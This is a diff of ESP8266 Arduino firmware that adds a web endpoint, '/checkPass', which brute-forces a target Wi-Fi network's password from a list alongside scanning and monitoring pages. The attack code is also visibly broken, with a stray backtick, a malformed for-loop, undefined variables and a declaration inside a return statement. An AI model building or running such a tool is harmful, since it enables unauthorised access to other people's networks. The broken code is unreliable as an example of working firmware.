@@ -6,36 +6,74 @@
 std::vector<String> scannedNet;
 std::vector<String> storeNetworks;
 
-char* ssid = "pwned";
-char* password = "password";
+char* apSsid = "pwned";
+char* apPassword = "password";
 ESP8266WebServer server(80);
 
-void handleRoot() {
-  String html = home.html;
-  server.send(200, "text/html", html);
+String ssidPass;
+
+
+void setup() {
+  Serial.begin(115200); // pls dont touch this sec
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP(apSsid, apPassword);`
+  Serial.println("goodies sta");
+
+  WiFi.begin(ssid, password);
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+  }
+  Serial.println("\nConnected, IP: " + WiFi.localIP().toString()); /// pls dont touch 
+  
+  server.on("/", handleRoot);
+  server.on("/input", inputHandler);
+  server.on("/monitor", monitorMode);
+  server.on("/checkPass", bruteForce);
+
+  server.begin();
+  Serial.println("Web server started");
 }
+
+void handleRoot() {
+  String html = home.html; server.send(200, "text/html", html);}
 
 void inputHandler() {
-  if (server.hasArg("input")) {
-    String input = server.arg("input");
+  if (server.hasArg("targetSsid")) {
+
+    String input = server.arg("targetSsid");
     Serial.println("Received input: " + input);
     server.send(200, "text/plain", "200 ok" + input);
+
   } else {
     server.send(400, "text/plain", "error 400");
   }
 }
 
-void routerIPHandler() {
-if (server.hasArg("routerIP")) {
-    String routerIP = server.arg("routerIP");
-    Serial.println("Received input: " + routerIP);
-    server.send(200, "text/plain", "200 ok" + routerIP);
-  } else {
-    server.send(400, "text/plain", "error 400");
+void bruteForce(){
+  String ssid = server.arg("targetSsid");
+  String password = server.arg("password");
+
+  WiFi.disconnect();
+
+  if(WiFi.status() != WL_CONNECTED){
+    for(i=0,i<array.size();++1){
+      String targetPass= array[i];
+      WiFi.begin(targetSsid.c_str(), targetPass.c_str());
+      delay(2000);// 2 sec
+
+      if(WiFi.status() == WL_CONNECTED){
+        return (String ssidPass = array[i]);
+      }
+    }
   }
+
+  // return True
+  String response = "<html><body><h1>Connecting to " + ssidPass + "</h1></body></html>";
+  server.send(200, "text/html", response);
 }
 
-void printOut(){
+void monitorMode(){
   String html = "<html><head><title>ESP8266 Data</title></head><body>";
   html += "<h1>Wi-Fi Scan Results</h1>";
   html += "<p>Found " + String(scannedNet.size()) + " networks:</p>";
@@ -51,25 +89,7 @@ void printOut(){
   server.send(200, "text/html", html);
 }
 
-void setup() {
-  Serial.begin(115200); // pls dont touch this sec
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  Serial.println("goodies sta");
 
-  WiFi.begin(ssid, password);
-  while (WiFi.status() != WL_CONNECTED) {
-    delay(500);
-    Serial.print(".");
-  }
-  Serial.println("\nConnected, IP: " + WiFi.localIP().toString()); /// pls dont touch 
-  
-  server.on("/", handleRoot);
-  server.on("/input", inputHandler);
-  server.on("/monitor", printOut);
-  server.begin();
-  Serial.println("Web server started");
-}
 
 
 void loop() {
